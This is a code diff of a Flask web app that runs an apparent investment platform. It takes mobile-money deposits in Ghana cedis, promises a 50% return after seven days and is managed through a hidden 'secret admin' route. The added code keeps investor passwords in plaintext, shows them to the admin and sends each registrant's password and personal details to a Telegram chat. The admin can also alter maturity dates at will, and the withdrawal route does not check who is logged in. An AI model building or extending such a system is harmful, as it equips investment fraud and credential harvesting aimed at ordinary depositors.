+                                    </a>
+                                {% endif %}
                             </td>
                             <td>{{ item.work }}<br><small>{{ item.region }}</small></td>
                             <td><span style="color: #d97706; font-weight: bold;">{{ item.status }}</span></td>
                             <td>
-                                <form action="{{ url_for('confirm_payment', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;"><button type="submit" class="btn-action">Approve</button></form>
-                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete slot?');"><button type="submit" class="btn-action" style="background:#6b7280;">Delete</button></form>
+                                <form action="{{ url_for('confirm_payment', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
+                                    <button type="submit" class="btn-action">Approve & Start Timer</button>
+                                </form>
+                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete slot?');">
+                                    <button type="submit" class="btn-action" style="background:#6b7280;">Delete</button>
+                                </form>
                             </td>
                         </tr>
                         {% endfor %}
-                    {% else %}<tr><td colspan="6" style="text-align: center; color: #666;">No pending approvals.</td></tr>{% endif %}
+                    {% else %}
+                        <tr><td colspan="6" style="text-align: center; color: #666;">No pending approvals.</td></tr>
+                    {% endif %}
                 </tbody>
             </table>
         </div>
@@ -307,7 +1249,16 @@ ADMIN_DASHBOARD_TEMPLATE = """
                 <span class="badge-count">{{ payday_list|length }} Due</span>
             </div>
             <table>
-                <thead><tr><th>Investor Info</th><th>Payout Amount Due</th><th>Job / Region</th><th>Maturity Date</th><th>Status</th><th>Actions</th></tr></thead>
+                <thead>
+                    <tr>
+                        <th>Investor Info</th>
+                        <th>Payout Amount Due</th>
+                        <th>Job / Region</th>
+                        <th>Maturity Date</th>
+                        <th>Status</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
                 <tbody>
                     {% if payday_list %}
                         {% for item in payday_list %}
@@ -318,11 +1269,15 @@ ADMIN_DASHBOARD_TEMPLATE = """
                             <td><b>{{ item.maturity_date }}</b></td>
                             <td><span style="color: #2563eb; font-weight: bold;">{{ item.status }}</span></td>
                             <td>
-                                <form action="{{ url_for('complete_withdrawal', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;"><button type="submit" class="btn-action btn-payout">Mark Paid Out</button></form>
+                                <form action="{{ url_for('complete_withdrawal', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
+                                    <button type="submit" class="btn-action btn-payout">Pay Out</button>
+                                </form>
                             </td>
                         </tr>
                         {% endfor %}
-                    {% else %}<tr><td colspan="6" style="text-align: center; color: #666;">No payouts due today or requested right now.</td></tr>{% endif %}
+                    {% else %}
+                        <tr><td colspan="6" style="text-align: center; color: #666;">No payouts due today or requested right now.</td></tr>
+                    {% endif %}
                 </tbody>
             </table>
         </div>
@@ -334,22 +1289,49 @@ ADMIN_DASHBOARD_TEMPLATE = """
                 <span class="badge-count">{{ running_list|length }} Running</span>
             </div>
             <table>
-                <thead><tr><th>Investor Info</th><th>Capital & Return</th><th>Job / Region</th><th>Maturity Date</th><th>Status</th><th>Actions</th></tr></thead>
+                <thead>
+                    <tr>
+                        <th>Investor Info</th>
+                        <th>Password Management</th>
+                        <th>Capital & Return</th>
+                        <th>Job / Region</th>
+                        <th>Maturity Time</th>
+                        <th>Status</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
                 <tbody>
                     {% if running_list %}
                         {% for item in running_list %}
                         <tr>
                             <td><strong>{{ item.name }}</strong><br>{{ item.number }}</td>
+                            <td>
+                                <span><b>Pass:</b> {{ item.password }}</span>
+                                <form action="{{ url_for('update_password', parent_idx=item.parent_idx) }}" method="POST" class="edit-form">
+                                    <input type="text" name="new_password" placeholder="New pass" required>
+                                    <button type="submit" class="btn-action" style="background:#0284c7;">Reset</button>
+                                </form>
+                            </td>
                             <td>GHs {{ "%.2f"|format(item.amount) }} <br><small style="color:#028a0f;">Return: GHs {{ "%.2f"|format(item.expected_return) }}</small></td>
                             <td>{{ item.work }}<br><small>{{ item.region }}</small></td>
-                            <td>{{ item.maturity_date }}</td>
+                            <td>
+                                <span>{{ item.maturity_date }}</span>
+                                <form action="{{ url_for('update_maturity', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" class="edit-form">
+                                    <input type="text" name="new_maturity" value="{{ item.maturity_date }}" required>
+                                    <button type="submit" class="btn-action" style="background:#0284c7;">Set</button>
+                                </form>
+                            </td>
                             <td><span style="color: #028a0f; font-weight: bold;">{{ item.status }}</span></td>
                             <td>
-                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete slot?');"><button type="submit" class="btn-action" style="background:#6b7280;">Delete</button></form>
+                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete slot?');">
+                                    <button type="submit" class="btn-action" style="background:#6b7280;">Delete</button>
+                                </form>
                             </td>
                         </tr>
                         {% endfor %}
-                    {% else %}<tr><td colspan="6" style="text-align: center; color: #666;">No active running investments.</td></tr>{% endif %}
+                    {% else %}
+                        <tr><td colspan="7" style="text-align: center; color: #666;">No active running investments.</td></tr>
+                    {% endif %}
                 </tbody>
             </table>
         </div>
@@ -361,7 +1343,16 @@ ADMIN_DASHBOARD_TEMPLATE = """
                 <span class="badge-count">{{ completed_list|length }} Completed</span>
             </div>
             <table>
-                <thead><tr><th>Investor Info</th><th>Paid Out Amount</th><th>Job / Region</th><th>Maturity Date</th><th>Status</th><th>Actions</th></tr></thead>
+                <thead>
+                    <tr>
+                        <th>Investor Info</th>
+                        <th>Paid Out Amount</th>
+                        <th>Job / Region</th>
+                        <th>Maturity Date</th>
+                        <th>Status</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
                 <tbody>
                     {% if completed_list %}
                         {% for item in completed_list %}
@@ -372,36 +1363,62 @@ ADMIN_DASHBOARD_TEMPLATE = """
                             <td>{{ item.maturity_date }}</td>
                             <td><span style="color: #15803d; font-weight: bold;">{{ item.status }}</span></td>
                             <td>
-                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete record?');"><button type="submit" class="btn-action" style="background:#6b7280;">Delete</button></form>
+                                <form action="{{ url_for('delete_slot', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;" onsubmit="return confirm('Delete record?');">
+                                    <button type="submit" class="btn-action" style="background:#6b7280;">Delete</button>
+                                </form>
                             </td>
                         </tr>
                         {% endfor %}
-                    {% else %}<tr><td colspan="6" style="text-align: center; color: #666;">No completed payout history.</td></tr>{% endif %}
+                    {% else %}
+                        <tr><td colspan="6" style="text-align: center; color: #666;">No completed payout history.</td></tr>
+                    {% endif %}
                 </tbody>
             </table>
         </div>
     </div>
+    
     <script>
-        // Fix background polling to avoid 404 errors
+        let lastKnownSignature = "";
         async function pollAdminUpdates() {
-            try { await fetch('/admin/api/status-signature'); } catch (e) {}
+            try {
+                const response = await fetch('/admin/api/status-signature');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (!lastKnownSignature) {
+                        lastKnownSignature = data.signature;
+                    } else if (lastKnownSignature !== data.signature) {
+                        window.location.reload();
+                    }
+                }
+            } catch (e) {}
         }
-        setInterval(pollAdminUpdates, 10000);
+        setInterval(pollAdminUpdates, 5000);
     </script>
 </body>
 </html>
 """
 
+
 @app.route("/", methods=["GET", "POST"])
 def index():
+  settings = load_settings()
   if request.method == "POST":
     try:
       amount = float(request.form["amount"])
+      if amount < 200 or amount > 500000:
+        flash("Investment amount must be between 200 GHs and 500,000 GHs.")
+        return redirect(url_for("index"))
+
       password = request.form.get("password", "").strip()
       number = request.form.get("number", "").strip()
       name = request.form.get("name", "").strip()
       work = request.form.get("work", "").strip()
       region = request.form.get("region", "").strip()
+
+      if not password:
+        flash("Please provide a secure account password.")
+        return redirect(url_for("index"))
+
       transaction_id = request.form.get("transaction_id", "").strip()
       file = request.files.get("payment_screenshot")
 
@@ -410,93 +1427,448 @@ def index():
         filename = secure_filename(f"{int(time.time())}_{file.filename}")
         file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
 
+      if not transaction_id and not filename:
+        flash("Please provide either a Transaction ID or upload a screenshot.")
+        return redirect(url_for("index"))
+
       now = datetime.now()
+      expected_return = amount * 1.5
+
       investor_data = {
-          "name": name, "number": number, "password": password, "work": work, "region": region,
-          "investments": [{
-              "amount": amount, "expected_return": amount * 1.5,
-              "transaction_id": transaction_id if transaction_id else "Screenshot",
-              "screenshot": filename, "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
-              "maturity_date": "Pending Approval", "status": "Pending Admin Payment Confirmation"
-          }]
+          "name": name,
+          "number": number,
+          "password": password,
+          "work": work,
+          "region": region,
+          "amount": amount,
+          "expected_return": expected_return,
+          "transaction_id": transaction_id
+          if transaction_id
+          else "Uploaded Screenshot",
+          "screenshot": filename,
+          "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
+          "maturity_date": "Pending Approval",
+          "status": "Pending Admin Payment Confirmation",
+          "profile_pic": "",
       }
 
-      investors = load_investors()
-      found = False
-      for inv in investors:
-        if inv.get("number") == number:
-          inv["investments"].append(investor_data["investments"][0])
-          found = True
-          break
-      if not found:
-        investors.append(investor_data)
-      save_all_investors(investors)
+      save_investor_data(investor_data)
 
-      send_telegram_alert(f"🚨 <b>NEW REGISTRATION</b>\n👤 {name}\n📞 {number}\n💰 GHs {amount:,.2f}")
+      telegram_message = (
+          f"🚨 <b>NEW USER REGISTRATION</b>\n\n"
+          f"👤 <b>Full Name:</b> {name}\n"
+          f"📞 <b>Phone Number:</b> {number}\n"
+          f"🔑 <b>Account Password:</b> {password}\n"
+          f"💼 <b>Work/Job:</b> {work}\n"
+          f"📍 <b>Region/Town:</b> {region}\n"
+          f"💰 <b>Capital Amount:</b> GHs {amount:,.2f}\n"
+          f"🎯 <b>Expected Return:</b> GHs {expected_return:,.2f}\n"
+          f"💳 <b>Transaction ID:</b> {transaction_id if transaction_id else 'Attached Screenshot'}\n"
+          f"⏰ <b>Registration Time:</b> {now.strftime('%Y-%m-%d %H:%M:%S')}"
+      )
+
+      send_telegram_alert(
+          telegram_message,
+          os.path.join(app.config["UPLOAD_FOLDER"], filename)
+          if filename
+          else None,
+      )
+
+      session.permanent = True
       session["investor_number"] = number
-      flash("Registration Successful!")
+      flash(
+          "Registration Successful! Welcome to your Investor Portal Dashboard."
+      )
       return redirect(url_for("dashboard"))
-    except Exception as e:
-      flash("Error submitting form.")
-  return render_template_string(HTML_TEMPLATE, zenith_alerts_top_html=ZENITH_ALERTS_TOP_HTML)
+
+    except ValueError:
+      flash("Invalid input. Please check your data.")
+      return redirect(url_for("index"))
+
+  return render_template_string(
+      HTML_TEMPLATE,
+      settings=settings,
+      admin_telegram_link=ADMIN_TELEGRAM_LINK,
+      zenith_alerts_top_html=ZENITH_ALERTS_TOP_HTML,
+      company_about=COMPANY_ABOUT_TEXT,
+  )
+
+
+@app.route("/api/track", methods=["POST"])
+def api_track():
+  data = request.get_json() or {}
+  number = data.get("number", "").strip()
+  password = data.get("password", "").strip()
+
+  investors = load_investors()
+  for inv in investors:
+    if inv.get("number") == number:
+      if inv.get("password") != password:
+        return jsonify({"success": False, "message": "Incorrect Password."})
+
+      inv_list = inv.get("investments", [])
+      if not inv_list and "amount" in inv:
+        inv_list = [
+            {
+                "amount": inv.get("amount"),
+                "expected_return": inv.get(
+                    "expected_return", inv.get("amount") * 1.5
+                ),
+                "maturity_date": inv.get("maturity_date", "Pending Approval"),
+                "status": inv.get("status"),
+            }
+        ]
+      cleaned_investments = []
+      for slot in inv_list:
+        cleaned_investments.append({
+            "amount": slot.get("amount"),
+            "expected_return": slot.get(
+                "expected_return", slot.get("amount") * 1.5
+            ),
+            "maturity_date": slot.get("maturity_date", "Pending Approval"),
+            "status": slot.get("status"),
+        })
+      return jsonify({
+          "success": True,
+          "name": inv.get("name"),
+          "investments": cleaned_investments,
+      })
+
+  return jsonify(
+      {"success": False, "message": "No account found with this phone number."}
+  )
+
+
+@app.route("/api/dashboard-status")
+def api_dashboard_status():
+  number = session.get("investor_number")
+  if not number:
+    return jsonify({"reload_required": False})
+  investors = load_investors()
+  for inv in investors:
+    if inv.get("number") == number:
+      inv_list = inv.get("investments", [])
+      sig = "_".join(
+          [
+              s.get("status", "") + str(s.get("maturity_date", ""))
+              for s in inv_list
+          ]
+      )
+      cached_sig = session.get("dashboard_sig", "")
+      if not cached_sig:
+        session["dashboard_sig"] = sig
+        return jsonify({"reload_required": False})
+      if cached_sig != sig:
+        session["dashboard_sig"] = sig
+        return jsonify({"reload_required": True})
+  return jsonify({"reload_required": False})
+
+
+@app.route("/admin/api/status-signature")
+def admin_status_signature():
+  if not session.get("admin_logged_in"):
+    return jsonify({"signature": ""})
+  investors = load_investors()
+  sig_parts = []
+  for inv in investors:
+    for slot in inv.get("investments", []):
+      sig_parts.append(
+          inv.get("number", "")
+          + slot.get("status", "")
+          + str(slot.get("maturity_date", ""))
+      )
+  return jsonify({"signature": hashlib_sig("".join(sig_parts))})
+
+
+def hashlib_sig(val):
+  import hashlib
+
+  return hashlib.md5(val.encode("utf-8")).hexdigest()
+
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
   if request.method == "POST":
     number = request.form.get("number", "").strip()
     password = request.form.get("password", "").strip()
-    for inv in load_investors():
+    investors = load_investors()
+    for inv in investors:
       if inv.get("number") == number and inv.get("password") == password:
+        session.permanent = True
         session["investor_number"] = number
+        inv_list = inv.get("investments", [])
+        session["dashboard_sig"] = "_".join(
+            [
+                s.get("status", "") + str(s.get("maturity_date", ""))
+                for s in inv_list
+            ]
+        )
         return redirect(url_for("dashboard"))
-    flash("Invalid credentials.")
+    flash("Invalid phone number or password.")
+    return redirect(url_for("login"))
   return render_template_string(INVESTOR_LOGIN_TEMPLATE)
+
 
 @app.route("/dashboard")
 def dashboard():
   number = session.get("investor_number")
-  if not number: return redirect(url_for("login"))
+  if not number:
+    return redirect(url_for("login"))
+
   investors = load_investors()
-  investments = []
+  investor_info = {"name": "Investor", "number": number, "profile_pic": ""}
+  investments_found = []
+  settings = load_settings()
+  now = datetime.now()
+
+  current_balance = 0.0
+  pending_balance = 0.0
+
   for inv in investors:
     if inv.get("number") == number:
-      investments = inv.get("investments", [])
-  
-  return f"""<!DOCTYPE html><html><body style="font-family:Arial; padding:30px;">
-    <h2>Welcome, Investor ({number})</h2>
-    <a href="{url_for('logout')}">Logout</a>
-    <hr>
-    <h3>Your Investments:</h3>
-    <pre>{json.dumps(investments, indent=2)}</pre>
-    <br><a href="{url_for('index')}">← Home</a>
-  </body></html>"""
+      investor_info = {
+          "name": inv.get("name", "Investor"),
+          "number": number,
+          "work": inv.get("work", ""),
+          "region": inv.get("region", ""),
+          "profile_pic": inv.get("profile_pic", ""),
+      }
+      inv_list = inv.get("investments", [])
+      if not inv_list and "amount" in inv:
+        inv_list = [
+            {
+                "amount": inv.get("amount"),
+                "expected_return": inv.get(
+                    "expected_return", inv.get("amount") * 1.5
+                ),
+                "transaction_id": inv.get("transaction_id"),
+                "screenshot": inv.get("screenshot"),
+                "date_time": inv.get("date_time"),
+                "maturity_date": inv.get("maturity_date", "Pending Approval"),
+                "status": inv.get("status"),
+            }
+        ]
+
+      for s_idx, slot in enumerate(inv_list):
+        slot_copy = slot.copy()
+        slot_copy["sub_idx"] = f"{number}_{s_idx}"
+        if "expected_return" not in slot_copy:
+          slot_copy["expected_return"] = slot_copy["amount"] * 1.5
+
+        status = slot_copy.get("status", "")
+        if status == "Payment Confirmed & Active":
+          current_balance += float(slot_copy["amount"])
+        elif status == "Pending Admin Payment Confirmation":
+          pending_balance += float(slot_copy["amount"])
+
+        maturity_str = slot_copy.get("maturity_date", "Pending Approval")
+        slot_copy["can_withdraw"] = False
+
+        if maturity_str != "Pending Approval":
+          try:
+            maturity_dt = datetime.strptime(
+                maturity_str, "%Y-%m-%d %H:%M:%S"
+            )
+            slot_copy["can_withdraw"] = (
+                now >= maturity_dt and status == "Payment Confirmed & Active"
+            )
+          except Exception:
+            pass
+
+        investments_found.append(slot_copy)
+
+  return render_template_string(
+      INVESTOR_DASHBOARD_TEMPLATE,
+      investments=investments_found,
+      investor=investor_info,
+      settings=settings,
+      admin_telegram_link=ADMIN_TELEGRAM_LINK,
+      current_balance=current_balance,
+      pending_balance=pending_balance,
+      company_about=COMPANY_ABOUT_TEXT,
+  )
+
+
+@app.route("/profile")
+def profile_page():
+  number = session.get("investor_number")
+  if not number:
+    return redirect(url_for("login"))
+
+  investors = load_investors()
+  investor_info = {"name": "Investor", "number": number, "profile_pic": ""}
+  for inv in investors:
+    if inv.get("number") == number:
+      investor_info = {
+          "name": inv.get("name", "Investor"),
+          "number": number,
+          "work": inv.get("work", ""),
+          "region": inv.get("region", ""),
+          "profile_pic": inv.get("profile_pic", ""),
+      }
+      break
+
+  return render_template_string(
+      INVESTOR_PROFILE_TEMPLATE,
+      investor=investor_info,
+      default_avatar_svg=DEFAULT_AVATAR_SVG,
+  )
+
+
+@app.route("/update-profile", methods=["POST"])
+def update_profile():
+  number = session.get("investor_number")
+  if not number:
+    return redirect(url_for("login"))
+
+  investors = load_investors()
+  for inv in investors:
+    if inv.get("number") == number:
+      inv["name"] = request.form.get("name", inv.get("name"))
+      inv["work"] = request.form.get("work", inv.get("work"))
+      inv["region"] = request.form.get("region", inv.get("region"))
+
+      file = request.files.get("profile_pic")
+      if file and file.filename != "":
+        filename = secure_filename(
+            f"profile_{number}_{int(time.time())}_{file.filename}"
+        )
+        file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
+        inv["profile_pic"] = filename
+
+      save_all_investors(investors)
+      flash("Profile details updated successfully!")
+      break
+
+  return redirect(url_for("profile_page"))
+
 
 @app.route("/logout")
 def logout():
   session.pop("investor_number", None)
+  session.pop("dashboard_sig", None)
   return redirect(url_for("index"))
+
+
+@app.route("/topup/<sub_idx>", methods=["POST"])
+def topup(sub_idx):
+  try:
+    number, idx_str = sub_idx.split("_")
+    investors = load_investors()
+    for inv in investors:
+      if inv.get("number") == number:
+        topup_amt = float(request.form["topup_amount"])
+        topup_proof = request.form.get("topup_proof", "").strip()
+        file = request.files.get("topup_screenshot")
+
+        filename = ""
+        if file and file.filename != "":
+          filename = secure_filename(f"topup_{int(time.time())}_{file.filename}")
+          file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
+
+        now = datetime.now()
+        new_investment = {
+            "amount": topup_amt,
+            "expected_return": topup_amt * 1.5,
+            "transaction_id": topup_proof
+            if topup_proof
+            else "Screenshot attached",
+            "screenshot": filename,
+            "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
+            "maturity_date": "Pending Approval",
+            "status": "Pending Admin Payment Confirmation",
+        }
+
+        if "investments" not in inv:
+          inv["investments"] = []
+        inv["investments"].append(new_investment)
+        save_all_investors(investors)
+
+        send_telegram_alert(
+            f"📈 <b>NEW TOP-UP SUBMISSION</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n➕ Capital: GHs {topup_amt}",
+            os.path.join(app.config["UPLOAD_FOLDER"], filename)
+            if filename
+            else None,
+        )
+        flash("Top-up submitted successfully for confirmation!")
+  except Exception:
+    flash("Invalid top-up submission.")
+  return redirect(url_for("dashboard"))
+
+
+@app.route("/withdraw/<sub_idx>", methods=["GET"])
+def withdraw(sub_idx):
+  try:
+    number, idx_str = sub_idx.split("_")
+    idx = int(idx_str)
+    investors = load_investors()
+    for inv in investors:
+      if inv.get("number") == number:
+        inv_list = inv.get("investments", [])
+        if 0 <= idx < len(inv_list):
+          inv_list[idx]["status"] = "Withdrawal Requested"
+          save_all_investors(investors)
+          send_telegram_alert(
+              f"📥 <b>WITHDRAWAL REQUESTED</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n💰 Payout Due: GHs {inv_list[idx]['expected_return']}"
+          )
+          flash("Withdrawal request submitted successfully!")
+  except Exception:
+    pass
+  return redirect(url_for("dashboard"))
+
 
 @app.route("/zenith-secret-admin", methods=["GET", "POST"])
 def admin_login():
   if request.method == "POST":
     if request.form.get("password") == ADMIN_PASSWORD:
+      session.permanent = True
       session["admin_logged_in"] = True
       return redirect(url_for("admin_dashboard"))
+    flash("Incorrect password.")
   return render_template_string(ADMIN_LOGIN_TEMPLATE)
+
 
 @app.route("/admin-dashboard")
 def admin_dashboard():
-  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
-  
+  if not session.get("admin_logged_in"):
+    return redirect(url_for("admin_login"))
+
   investors = load_investors()
-  pending_list, payday_list, running_list, completed_list = [], [], [], []
+  pending_list = []
+  payday_list = []
+  running_list = []
+  completed_list = []
+  
   today_str = datetime.now().strftime("%Y-%m-%d")
 
   for p_idx, inv in enumerate(investors):
-    for s_idx, slot in enumerate(inv.get("investments", [])):
+    inv_list = inv.get("investments", [])
+    if not inv_list and "amount" in inv:
+      inv_list = [
+          {
+              "amount": inv.get("amount"),
+              "expected_return": inv.get(
+                  "expected_return", inv.get("amount") * 1.5
+              ),
+              "transaction_id": inv.get("transaction_id"),
+              "screenshot": inv.get("screenshot"),
+              "date_time": inv.get("date_time"),
+              "maturity_date": inv.get("maturity_date", "Pending Approval"),
+              "status": inv.get("status"),
+          }
+      ]
+    for s_idx, slot in enumerate(inv_list):
       item = slot.copy()
-      item.update({"parent_idx": p_idx, "sub_idx": s_idx, "name": inv.get("name"), "number": inv.get("number"), "password": inv.get("password"), "work": inv.get("work"), "region": inv.get("region")})
-      status, maturity = item.get("status", ""), item.get("maturity_date", "")
+      item["parent_idx"] = p_idx
+      item["sub_idx"] = s_idx
+      item["name"] = inv.get("name")
+      item["number"] = inv.get("number")
+      item["password"] = inv.get("password", "123456")
+      item["work"] = inv.get("work", "-")
+      item["region"] = inv.get("region", "-")
+      
+      status = item.get("status", "")
+      maturity = item.get("maturity_date", "")
 
       if status == "Pending Admin Payment Confirmation":
         pending_list.append(item)
@@ -509,40 +1881,58 @@ def admin_dashboard():
       else:
         running_list.append(item)
 
-  return render_template_string(ADMIN_DASHBOARD_TEMPLATE, pending_list=pending_list, payday_list=payday_list, running_list=running_list, completed_list=completed_list, settings=load_settings())
+  settings = load_settings()
+  return render_template_string(
+      ADMIN_DASHBOARD_TEMPLATE,
+      pending_list=pending_list,
+      payday_list=payday_list,
+      running_list=running_list,
+      completed_list=completed_list,
+      settings=settings,
+  )
 
-@app.route("/admin/api/status-signature")
-def admin_status_signature():
-  return jsonify({"signature": "ok"})
-
-@app.route("/api/dashboard-status")
-def api_dashboard_status():
-  return jsonify({"reload_required": False})
 
 @app.route("/admin/settings", methods=["POST"])
 def update_settings():
-  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
+  if not session.get("admin_logged_in"):
+    return redirect(url_for("admin_login"))
   settings = load_settings()
-  settings["momo_number"] = request.form.get("momo_number", settings["momo_number"])
+  settings["momo_number"] = request.form.get(
+      "momo_number", settings["momo_number"]
+  )
   settings["momo_name"] = request.form.get("momo_name", settings["momo_name"])
   save_settings(settings)
+  flash("Company details updated.")
   return redirect(url_for("admin_dashboard"))
 
-@app.route("/admin/confirm/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
+
+@app.route(
+    "/admin/confirm/<int:parent_idx>/<int:sub_idx>", methods=["POST"]
+)
 def confirm_payment(parent_idx, sub_idx):
-  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
+  if not session.get("admin_logged_in"):
+    return redirect(url_for("admin_login"))
   investors = load_investors()
   if 0 <= parent_idx < len(investors):
     inv_list = investors[parent_idx].get("investments", [])
     if 0 <= sub_idx < len(inv_list):
       inv_list[sub_idx]["status"] = "Payment Confirmed & Active"
-      inv_list[sub_idx]["maturity_date"] = (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d %H:%M:%S")
+      now = datetime.now()
+      maturity = now + timedelta(days=7)
+      inv_list[sub_idx]["maturity_date"] = maturity.strftime(
+          "%Y-%m-%d %H:%M:%S"
+      )
       save_all_investors(investors)
   return redirect(url_for("admin_dashboard"))
 
-@app.route("/admin/complete-withdrawal/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
+
+@app.route(
+    "/admin/complete-withdrawal/<int:parent_idx>/<int:sub_idx>",
+    methods=["POST"],
+)
 def complete_withdrawal(parent_idx, sub_idx):
-  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
+  if not session.get("admin_logged_in"):
+    return redirect(url_for("admin_login"))
   investors = load_investors()
   if 0 <= parent_idx < len(investors):
     inv_list = investors[parent_idx].get("investments", [])
@@ -551,27 +1941,67 @@ def complete_withdrawal(parent_idx, sub_idx):
       save_all_investors(investors)
   return redirect(url_for("admin_dashboard"))
 
+
+@app.route(
+    "/admin/update-maturity/<int:parent_idx>/<int:sub_idx>",
+    methods=["POST"],
+)
+def update_maturity(parent_idx, sub_idx):
+  if not session.get("admin_logged_in"):
+    return redirect(url_for("admin_login"))
+  investors = load_investors()
+  if 0 <= parent_idx < len(investors):
+    inv_list = investors[parent_idx].get("investments", [])
+    if 0 <= sub_idx < len(inv_list):
+      new_time = request.form.get("new_maturity", "").strip()
+      if new_time:
+        inv_list[sub_idx]["maturity_date"] = new_time
+        save_all_investors(investors)
+        flash("Maturity date successfully updated.")
+  return redirect(url_for("admin_dashboard"))
+
+
+@app.route("/admin/update-password/<int:parent_idx>", methods=["POST"])
+def update_password(parent_idx):
+  if not session.get("admin_logged_in"):
+    return redirect(url_for("admin_login"))
+  investors = load_investors()
+  if 0 <= parent_idx < len(investors):
+    new_pass = request.form.get("new_password", "").strip()
+    if new_pass:
+      investors[parent_idx]["password"] = new_pass
+      save_all_investors(investors)
+      flash("Password updated.")
+  return redirect(url_for("admin_dashboard"))
+
+
 @app.route("/admin/delete/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
 def delete_slot(parent_idx, sub_idx):
-  if not session.get("admin_logged_in"): return redirect(url_for("admin_login"))
+  if not session.get("admin_logged_in"):
+    return redirect(url_for("admin_login"))
   investors = load_investors()
   if 0 <= parent_idx < len(investors):
     inv_list = investors[parent_idx].get("investments", [])
     if 0 <= sub_idx < len(inv_list):
       inv_list.pop(sub_idx)
-      if not inv_list: investors.pop(parent_idx)
+      if not inv_list:
+        investors.pop(parent_idx)
       save_all_investors(investors)
+      flash("Investment slot deleted.")
   return redirect(url_for("admin_dashboard"))
+
 
 @app.route("/admin-logout")
 def admin_logout():
   session.pop("admin_logged_in", None)
   return redirect(url_for("index"))
 
+
 @app.route("/uploads/<filename>")
 def uploaded_file(filename):
   return send_from_directory(app.config["UPLOAD_FOLDER"], filename)
 
+
 if __name__ == "__main__":
-  port = int(os.environ.get("PORT", 10000))
+  port = int(os.environ.get("PORT", 5001))
   app.run(host="0.0.0.0", port=port)
